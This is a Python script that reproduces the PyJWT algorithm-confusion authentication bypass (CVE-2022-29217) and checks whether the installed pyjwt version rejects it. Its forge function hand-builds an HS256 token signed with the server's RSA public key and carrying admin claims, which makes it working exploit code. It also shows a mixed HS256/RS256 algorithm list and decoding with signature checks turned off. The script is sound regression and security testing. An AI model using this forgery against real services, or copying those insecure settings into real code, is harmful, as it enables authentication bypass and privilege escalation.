"""Anchor: reproduce the real PyJWT algorithm-confusion auth bypass
(CVE-2022-29217) on the DECODE side, where it lived, and confirm current
pyjwt rejects it. The forged token is crafted by hand (base64url + raw
HMAC) exactly as an attacker would — not via jwt.encode, whose key guard
is irrelevant to the attack.

Set JWT_PYLIBS to a dir with a specific pyjwt+cryptography install.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import sys

PKGLIBS = os.environ.get("JWT_PYLIBS")
if PKGLIBS:
    sys.path.insert(0, PKGLIBS)

import jwt  # noqa: E402
from cryptography.hazmat.primitives.asymmetric import rsa  # noqa: E402
from cryptography.hazmat.primitives import serialization  # noqa: E402


def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def rsa_public_pem() -> bytes:
    k = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    return k.public_key().public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    )


def forge_hs256_with_pubkey(pub_pem: bytes, claims: dict) -> str:
    """Attacker's forgery: HS256, HMAC secret = the server's PUBLIC key."""
    header = {"alg": "HS256", "typ": "JWT"}
    signing_input = (
        b64url(json.dumps(header, separators=(",", ":")).encode())
        + "."
        + b64url(json.dumps(claims, separators=(",", ":")).encode())
    )
    sig = hmac.new(pub_pem, signing_input.encode(), hashlib.sha256).digest()
    return signing_input + "." + b64url(sig)


def main() -> int:
    print(f"pyjwt version: {jwt.__version__}")
    pub = rsa_public_pem()
    forged = forge_hs256_with_pubkey(pub, {"sub": "attacker", "role": "admin"})

    # Server intends RS256 but lists both algorithms (the CVE misconfig).
    server_algorithms = ["HS256", "RS256"]
    confusion_accepted = False
    try:
        claims = jwt.decode(forged, pub, algorithms=server_algorithms)
        print("ALG-CONFUSION ACCEPTED:", claims)
        confusion_accepted = True
    except Exception as e:
        print("alg-confusion rejected on decode:", type(e).__name__)

    # alg=none-equivalent: claims retrievable with no signature check.
    try:
        unauth = jwt.decode(forged, options={"verify_signature": False})
        print("UNVERIFIED DECODE RETURNS CLAIMS:", unauth)
    except Exception as e:
        print("unverified decode error:", type(e).__name__)

    print(f"RESULT confusion_accepted={confusion_accepted}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
